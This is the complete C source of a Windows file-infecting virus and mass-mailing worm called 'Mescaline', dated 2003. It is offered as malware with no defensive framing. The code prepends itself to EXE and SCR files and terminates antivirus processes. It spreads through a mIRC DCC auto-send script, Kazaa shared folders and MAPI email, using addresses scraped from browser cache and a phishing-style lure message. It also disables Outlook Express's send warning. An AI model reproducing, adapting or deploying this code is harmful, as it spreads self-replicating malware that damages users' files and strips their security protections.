/*
   Mescaline Virus � 2003 DR-EF All Right Reserved
   ================================================
  When Infected File Is Run The Virus Do This Steps:
	1) Get Virus Path & Command Line
	2) Hide The Virus Process
	3) Disable AntiViruses Monitors
	4) Active The Payload
	5) Go TSR & Infect Any EXE\SCR File After He Closed
	6) Execute The Host
	7) Modify Mirc To Send The Virus To Chatted Users
	8) Infect Every EXE\SCR File In The First Ten Kazaa Shared Dirs
  Every 25 Infections The Virus Use MAPI To Mail Himself To Address That
  He Found In Temporary HTML Files.
*/

#include &lt;stdafx.h&gt;
#include &lt;stdio.h&gt;
#include &lt;malloc.h&gt;
#include &lt;tlhelp32.h&gt;
#include &lt;shellapi.h&gt;
#include &lt;mapi.h&gt;

const virus_size=49160;
char viruscopyright[]="[Mescaline] Virus (c) 2oo3 DR-EF";
char VirusPath[MAX_PATH],VirusParameters[MAX_PATH],VirusTempFile[MAX_PATH];
tagPROCESSENTRY32 stproc;
char lst[150][MAX_PATH],addbook[300][MAX_PATH],htmfiles[300][MAX_PATH];
int Founded=0,Position;

/*------------------[File Infection Functions]---------------*/

void write_virus(char virus_path[],char WriteTo[],int Virus_Size)
{
	FILE *File_Handle;
	void *viruscode=malloc(Virus_Size);
	File_Handle=fopen(virus_path,"rb");
	if(File_Handle!=NULL)
	{
		fread(viruscode,Virus_Size,1,File_Handle);
		fclose(File_Handle);
	}
	File_Handle=fopen(WriteTo,"wb");
	if(File_Handle!=NULL)
	{
		fwrite(viruscode,Virus_Size,1,File_Handle);
		fclose(File_Handle);
	}
	free(viruscode);
}
void Infect_file(char Virus_path[],char Victim[],char mark[])
{
	char temp_file[MAX_PATH],check[sizeof(mark)];
	int fsize,mcmp;
	FILE *File_Handle;
	HANDLE hfile,hfileDT;
	DWORD attr;
	FILETIME creation,access,change;
	WIN32_FIND_DATA ffile;
	File_Handle=fopen(Victim,"rb");
	hfile=FindFirstFile(Victim,&ffile);
	fsize=ffile.nFileSizeLow;
	void *data=malloc(ffile.nFileSizeLow);
	fread(data,fsize,1,File_Handle);
	fseek(File_Handle,(fsize-sizeof(mark)),0);
	fread(&check,sizeof(mark),1,File_Handle);
	mcmp=memcmp(check,mark,sizeof(mark));
	fclose(File_Handle);
	if (mcmp!=0)
	{
		attr=GetFileAttributes(Victim);
		SetFileAttributes(Victim,FILE_ATTRIBUTE_NORMAL);
		hfileDT=CreateFile(Victim,GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ | FILE_SHARE_WRITE,0,OPEN_EXISTING,0,0);
		GetFileTime(hfileDT,&creation,&access,&change);
		CloseHandle(hfileDT);
		strcpy(temp_file,Victim);
		strcat(temp_file,"_I");
		write_virus(Virus_path,temp_file,virus_size);
		File_Handle=fopen(temp_file,"ab");
		fwrite(data,ffile.nFileSizeLow,1,File_Handle);
		fwrite(mark,sizeof(mark),1,File_Handle);
		fclose(File_Handle);
		DeleteFile(Victim);
		hfileDT=CreateFile(temp_file,GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ | FILE_SHARE_WRITE,0,OPEN_EXISTING,0,0);
		SetFileTime(hfileDT,&creation,&access,&change);
		CloseHandle(hfileDT);
		CopyFile(temp_file,Victim,true);
		SetFileAttributes(Victim,attr);
	}
	DeleteFile(temp_file);
	free(data);
	FindClose(hfile);
}

int Run_Infected_File(char File[],char Parm[],int Virus_Size)
{
	FILE *hfile;
	HANDLE h_file;
	WIN32_FIND_DATA ffile;
	int host_size,is_end=0;
	void *data;
	h_file=FindFirstFile(File,&ffile);
	host_size=(ffile.nFileSizeLow-Virus_Size);
	hfile=fopen(File,"rb");
	if(hfile!=NULL)
	{
		data=malloc(host_size);
		fseek(hfile,Virus_Size,SEEK_SET);
		fread(data,host_size,1,hfile);
		fclose(hfile);
	}
	char temp_file[MAX_PATH],cmd[MAX_PATH];
	strcpy(temp_file,File);
	strcat(temp_file,"_v");
	if(GetFileAttributes(temp_file) != -1 && DeleteFile(temp_file) == 0)
	{		// ^-&gt; Check If The File Executed Before.
		strcat(temp_file," ");
		strcat(temp_file,Parm);
		free(data);
		FindClose(h_file);
		WinExec(temp_file,1);
		return(1);
	}
	hfile=fopen(temp_file,"wb");
	if(hfile!=NULL)
	{
		fwrite(data,host_size,1,hfile);
		fclose(hfile);
	}
	free(data);
	FindClose(h_file);
	SetFileAttributes(temp_file,FILE_ATTRIBUTE_HIDDEN);
	strcpy(cmd,temp_file);
	if (strlen(Parm) &gt; 0 )
	{
		strcat(cmd," ");
		strcat(cmd,Parm);
	}
	WinExec(cmd,1);
	SleepEx(500,0);
	do
	{
		is_end=DeleteFile(temp_file);
	}
	while(is_end!=1);
	return(1);
}

/*------------------------[Misc Functions]---------------------*/

void PayLoad()
{
SYSTEMTIME time;
GetSystemTime(&time);
if ((time.wHour==0)==1)
{
MessageBox(NULL,"Have You Ever Had The Feeling\nThat You Not Sure If We Wake Or Still Dreaming...\nIt's Call Mescaline\nIt's The Only Way To Fly...",viruscopyright,MB_ICONINFORMATION);
for(int i=1;i&lt;9999;i++)
	SetWindowText((HWND)(i),viruscopyright);
}
}

void AntiAV()
{
	HANDLE hsnp,hproc;
	char MayBeAV[MAX_PATH];
	tagPROCESSENTRY32 proc;
	hsnp=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
	proc.dwSize=sizeof(proc);
	Process32First(hsnp,&proc);
	do
	{
		strcpy(MayBeAV,proc.szExeFile);
		strlwr(MayBeAV);
		if(strstr(MayBeAV,"anti") != 0 || strstr(MayBeAV,"avp") != 0 ||
		   strstr(MayBeAV,"rav") != 0 || strstr(MayBeAV,"nav") != 0 ||
		   strstr(MayBeAV,"troj") != 0 || strstr(MayBeAV,"scan") != 0 ||
		   strstr(MayBeAV,"viru") != 0 || strstr(MayBeAV,"safe") != 0)
		{
			hproc=OpenProcess(0,FALSE,proc.th32ProcessID);
			TerminateProcess(hproc,666);
			CloseHandle(hproc);
		}
	}
	while(Process32Next(hsnp,&proc));
	CloseHandle(hsnp);
}

void InitVirus()
{
	char *cmd,kernel_path[MAX_PATH];
	int pos=0;
	HMODULE krnl;
	FARPROC RSP;
	cmd=GetCommandLine();
	cmd++;
	do
	{
		VirusPath[pos]=(*cmd);
		pos++;
		*cmd++;
	}
	while((*cmd) != '"');
	cmd++;
	if ((*cmd) != 0)
	{
		cmd++;
		pos=0;
		while((*cmd) != NULL)
			{
			VirusParameters[pos]=(*cmd);
			cmd++;
			pos++;
			}
	}
	GetTempPath(MAX_PATH,VirusTempFile);
	strcat(VirusTempFile,"Mescaline.exe");
	GetSystemDirectory(kernel_path,MAX_PATH);
	strcat(kernel_path,"\\Kernel32.dll");
	krnl=LoadLibrary(kernel_path);
	if (krnl != NULL)
	{
		RSP=GetProcAddress(krnl,"RegisterServiceProcess");
		if (RSP != NULL)
		{
			__asm
				{
					push 01h
					push 00h
					call RSP
				}
		}
	}
	FreeLibrary(krnl);
	AntiAV();
}

void IRC()
{
	char mirc[MAX_PATH],File[MAX_PATH];
	FILE *hfile;
	strcpy(mirc,"C:\\Program Files\\mIRC\\");
	strcpy(File,mirc);
	strcat(File,"mirc.ini");
	if(GetFileAttributes(File)!=-1)
	{
		WritePrivateProfileString("rfiles","n2","mirc.dll",File);
		strcpy(File,mirc);
		strcat(File,"hi.scr");
		CopyFile(VirusPath,File,false);
		strcpy(File,mirc);
		strcat(File,"mirc.dll");
		hfile=fopen(File,"w");
		if(hfile!=NULL)
		{
			fprintf(hfile,"on 1:join:#: { if ( $nick == $me ) halt\n");
			fprintf(hfile,"else /dcc send $nick %shi.scr }",mirc);
			fclose(hfile);
		}
	}
}


BOOL IsInfectable(char filename[])
{
	char last[3];
	int i;
	for(i=1;i&lt;(int)strlen(filename);i++)
	{
		last[0]=filename[i-2];
		last[1]=filename[i-1];
		last[2]=filename[i];
	}
	strlwr(last);
	if(memcmp(last,"exe",3)==0 || memcmp(last,"scr",3)==0)
	{
		return(TRUE);
	}
	return(FALSE);
}

int Sucker2Sucker()
{
	HKEY hkey;
	int RetValue,i,num;;
	unsigned char share[MAX_PATH];
	unsigned long Sshare=sizeof(share);
	char search[MAX_PATH],path[MAX_PATH],full[MAX_PATH],text[3];
	HANDLE hfile;
	WIN32_FIND_DATA hfind;
	RetValue=RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Kazaa\\LocalContent",0,KEY_QUERY_VALUE,&hkey);
	if(RetValue != ERROR_SUCCESS)
		return(1);
	strcpy(search,"");
	for(num=48;num!=58;num++)
	{
		text[0]='d';
		text[1]='i';
		text[2]='r';
		text[3]=num;
		for(i=0;i!=4;i++)
			search[i]=text[i];
		for(i=4;i!=MAX_PATH;i++)
			search[i]=NULL;
		RetValue=RegQueryValueEx(hkey,search,0,NULL,share,&Sshare);
		if(RetValue == ERROR_SUCCESS)
		{
			for(i=7;i&lt;MAX_PATH;i++)
				path[i-7]=share[i];
			strcpy(search,path);
			strcat(path,"\\*.*");
			hfile=FindFirstFile(path,&hfind);
			if (hfile != INVALID_HANDLE_VALUE)
			{
				do
				{
					strcpy(full,search);
					strcat(full,"\\");
					strncat(full,hfind.cFileName,sizeof(hfind.cFileName));
					if(IsInfectable(full)==TRUE && strlen(full)&gt;10)
						Infect_file(VirusPath,full,"Ml");
				}
				while(FindNextFile(hfile,&hfind));
				FindClose(hfile);
			}
		}
	}
	RegCloseKey(hkey);
	return(1);
}

/*-----------------------[Mapi Worm]----------------------*/

int worming()
{
	char mapidll[MAX_PATH];
	LPSTR mail_msg="Secret Password,Data,Information Can Be Found Here !!!\nIn This e-mail you can find a lot of secret info\nlike password to web servers and documentation about hacking\nlike 'how to hack web server.txt',or 'How To crack ZIP archive.doc'\n(all documents are in the HackInfo.exe compressed package)\nif you like such stuff you can free register in our web site:\nwww.BestHackersOfTheWorld.com and you will get every week a new\npackage,like the one in the attachment,for free !!!\n\nif you don't want to get mail like this any more please send\n\ta blank e-mail to : BestHackers@dREF.com\n\nand if you want to support us send this mail without any\nchanging to other people that you know.\n\tThank You For Reading This Mail.";
	GetSystemDirectory(mapidll,MAX_PATH);
	strcat(mapidll,"\\mapi32.dll");
	HMODULE MapiModule;
	MapiModule=LoadLibrary(mapidll);
	__asm
		mov eax,01h		; Fix An Expection With The Msoe.dll library
	if(MapiModule==NULL)
		return(1);
	FARPROC SendMail,LogOn,LogOff;
	MapiFileDesc mfile;
	MapiMessage msg;
	MapiRecipDesc rec;
	SendMail=GetProcAddress(MapiModule,"MAPISendMail");
	LogOn=GetProcAddress(MapiModule,"MAPILogon");
	LogOff=GetProcAddress(MapiModule,"MAPILogoff");
	LHANDLE MapiSession;
	if((LogOn == NULL) || (LogOff == NULL) || (SendMail == NULL))
	{
		FreeLibrary(MapiModule);
		return(1);
	}
	int retvalue,i;
	__asm /* MapiLogOn */
	{
		lea eax,MapiSession
		push eax	;lplhSession
		push 00h	;ulReserved
		push 00h	;flFlags
		push 00h	;lpszPassword
		push 00h	;lpszProfileName
		push 00h	;ulUIParam
		call LogOn
		mov retvalue,eax
	}
	if (retvalue != SUCCESS_SUCCESS)
	{
		FreeLibrary(MapiModule);
		return(1);
	}
	for(i=1;i&lt;Founded;i++)
	{
		mfile.lpszPathName=VirusPath;
		mfile.lpszFileName="HackInfo - Package1.exe";
		mfile.nPosition=-1;
		mfile.ulReserved=0;
		rec.ulRecipClass=MAPI_TO;
		rec.lpszName=addbook[i];
		rec.ulReserved=0;
		msg.nFileCount=1;
		msg.lpszNoteText=mail_msg;
		msg.lpszSubject="Best Hackers Teaching You How To Be Hacker !!!";
		msg.ulReserved=0;
		msg.nRecipCount=1;
		msg.lpFiles=&mfile;
		msg.lpRecips=&rec;
		__asm /* MapiSendMail */
			{
				push 00h	;ulReserved
				push 00h	;flFlags
				lea eax,msg
				push eax	;lpMessage
				push 00h	;ulUIParam
				push MapiSession	;lhSession
				call SendMail
				mov retvalue,eax
			}
		if (retvalue != SUCCESS_SUCCESS)
			{
					FreeLibrary(MapiModule);
					return(1);
			}
	}
	__asm /* MAPILogoff */
	{
		push 00h	;ulReserved
		push 00h	;flFlags
		push 00h	;ulUIParam
		push MapiSession;lhSession
		call LogOff
	}
	FreeLibrary(MapiModule);
	return(1);
}

void FindFilesAndMails(char where[])
{
	char path[MAX_PATH],fullpath[MAX_PATH],buffer[100],mailbuffer[100];
	int i=0;
	BOOL already_have;
	FILE *hfiles;
	size_t size;
	strcpy(path,where);
	strcat(path,"*.*");
	WIN32_FIND_DATA find;
	HANDLE hfile;
	hfile=FindFirstFile(path,&find);
	if (hfile != NULL)
	{
		do
		{
			strcpy(fullpath,where);
			strcat(fullpath,find.cFileName);
			strlwr(find.cFileName);
			if (find.dwFileAttributes==(FILE_ATTRIBUTE_SYSTEM+FILE_ATTRIBUTE_DIRECTORY))
			{
				if ((strcmp(find.cFileName,".") != 0) || (strcmp(find.cFileName,"..") != 0))
				{
				strcat(fullpath,"\\");
				FindFilesAndMails(fullpath);
				}
			}
			if (strstr(find.cFileName,"ht") != 0)
			{
				hfiles=fopen(fullpath,"rt");
				if (hfiles!=NULL)
				{
					do
					{
						already_have=FALSE;
						strcpy(mailbuffer,"");
						size=fread(&buffer,sizeof(buffer),1,hfiles);
						strlwr(buffer);
						char *temp=strstr(buffer,"mailto:");
						if (temp!=NULL)
						{
							temp=temp+7;
							for(i=0;(i&lt;=MAX_PATH)&&(*temp!='"')&&(*temp!='?')&&(*temp!='&lt;');i++,temp++)
							mailbuffer[i]=*temp;
							mailbuffer[i]=NULL;
							if((strstr(mailbuffer,"@")!=NULL) && strlen(mailbuffer)&lt;30)
								if (Founded &lt; 299)
								{
									for(i=1;i&lt;=Founded;i++)
										if(strcmp(addbook[i],mailbuffer)==0)
											already_have=TRUE;
									if(already_have==FALSE)
									{
										Founded++;
										strcpy(addbook[Founded],mailbuffer);
									}
								}
						}
					}while(size);
					fclose(hfiles);
				}
			}
		}
		while(FindNextFile(hfile,&find));
		FindClose(hfile);
	}
}

void Active_Worm()
{
	unsigned char GetValue[MAX_PATH];
	unsigned long GetSize=sizeof(GetValue);
	char fullpath[MAX_PATH],dir[MAX_PATH];
	int i,p=0,x=0;
	GetWindowsDirectory(dir,MAX_PATH);
	strcat(dir,"\\Temporary Internet Files\\");
	FindFilesAndMails(dir);
	HKEY hkey;
	RegOpenKeyEx(HKEY_CURRENT_USER,"Identities",KEY_QUERY_VALUE,0,&hkey);
	strcpy(fullpath,"Identities\\");
	x=RegQueryValueEx(hkey,"Default User ID",0,NULL,GetValue,&GetSize);
	if (x==0)
	{
		for(i=strlen(fullpath);i&lt;MAX_PATH;i++,p++)
			fullpath[i]=GetValue[p];
		strcat(fullpath,"\\Software\\Microsoft\\Outlook Express\\5.0\\Mail");
		x=RegOpenKeyEx(HKEY_CURRENT_USER,fullpath,NULL,KEY_WRITE,&hkey);
		if (x==0)
		RegSetValueEx(hkey,"Warn on Mapi Send",0,REG_DWORD,(LPBYTE)&x,sizeof(x));
	}	// ^-&gt; Micro$oft Security ;)
	RegCloseKey(hkey);
	SleepEx(1000,false);
	worming();
}

/*-------------------[Memory Resident Functions]--------------*/

BOOL IsProcessExist(char ProcName[])
{
	int i;
	for(i=0;i&lt;=Position;i++)
	{
		if(strcmp(lst[i],ProcName)==0)
			return (TRUE);
	}
	return(FALSE);
}

void add_proc(char procname[])
{
	if(IsProcessExist(procname)!=TRUE)
	{
		Position++;
		strcpy(lst[Position],procname);
	}
}

void ProcFindAll()
{
	HANDLE hsnp;
	hsnp=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
	stproc.dwSize=sizeof(stproc);
	Process32First(hsnp,&stproc);
	do
	{
		add_proc(stproc.szExeFile);
	}
	while(Process32Next(hsnp,&stproc));
	CloseHandle(hsnp);
}

void FindNextFileToInfect()
{
	HANDLE hsnp;
	BOOL found_it=TRUE;
	char my_Target[MAX_PATH];
	strcpy(my_Target,"");
Start:
	hsnp=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
	stproc.dwSize=sizeof(stproc);
	Process32First(hsnp,&stproc);
	do
	{
		SleepEx(10,0);
		if(IsProcessExist(stproc.szExeFile)==FALSE)
		{
			add_proc(stproc.szExeFile);
			strcpy(my_Target,stproc.szExeFile);
			break;
		}
	}
	while(Process32Next(hsnp,&stproc));
	CloseHandle(hsnp);
	if (strlen(my_Target)==0 && IsProcessExist(my_Target)==TRUE)
	{
		goto Start;
	}
Start2:
	hsnp=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
	Process32First(hsnp,&stproc);
	do
	{
		SleepEx(10,0);
		if (strcmp(stproc.szExeFile,my_Target) != 0)
		{
			found_it=FALSE;
		}
		else if (strcmp(stproc.szExeFile,my_Target) == 0)
		{
			found_it=TRUE;
		}
	}
	while(Process32Next(hsnp,&stproc));
	CloseHandle(hsnp);
	if (found_it==TRUE || strlen(my_Target)==0)
	{
		goto Start2;
	}
	if (IsInfectable(my_Target)==TRUE)
	{
//	MessageBox(NULL,my_Target,"Debug:Virus Catch File",MB_OK);
	Infect_file(VirusPath,my_Target,"Ml");
	}
}

void TSR_Mode()
{
if(strcmp(VirusTempFile,VirusPath)==0)
	{
		ProcFindAll();
		for(int i=1;i&lt;=2;i++)
		{
			AntiAV();
			FindNextFileToInfect();
		}
		if(Position==149)
			ExitProcess(1);
		else if(Position!=149)
		{
			Active_Worm();
			SleepEx(10000,0);
			TSR_Mode();
		}
	}
}

void GoTSR()
{
	DeleteFile(VirusTempFile);
	if (GetFileAttributes(VirusTempFile)==-1)
	{
		write_virus(VirusPath,VirusTempFile,virus_size);
		SleepEx(500,0);
		ShellExecute(NULL,"open",VirusTempFile,"","",1);
	}
}


/*----------------------[Main Function]--------------------*/

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	InitVirus();
	PayLoad();
	GoTSR();
	Run_Infected_File(VirusPath,VirusParameters,virus_size);
	IRC();
	Sucker2Sucker();
	if (hPrevInstance)
		ExitProcess(1);
	TSR_Mode();
	return 0;
}
